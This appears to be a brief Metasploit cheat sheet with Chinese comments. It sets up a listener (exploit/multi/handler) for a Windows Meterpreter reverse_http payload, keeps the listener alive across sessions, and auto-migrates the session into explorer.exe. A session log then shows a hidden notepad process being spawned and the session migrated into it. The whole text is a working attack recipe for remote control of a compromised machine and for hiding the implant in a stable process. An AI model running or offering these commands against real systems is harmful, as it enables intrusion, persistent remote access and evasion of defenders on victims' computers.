use exploit/multi/handler

set payload windows/meterpreter/reverse_http

set ExitOnSession false //设置会话不掉线，一直监听

# hander设置AutoRunScript，自动迁移到稳定进程

set AutoRunScript "migrate -n explorer.exe"
# 找不到explorer的情况下，尽快创建并迁移
meterpreter > execute -H -f notepad
Process 1196 created.
meterpreter > migrate 1196
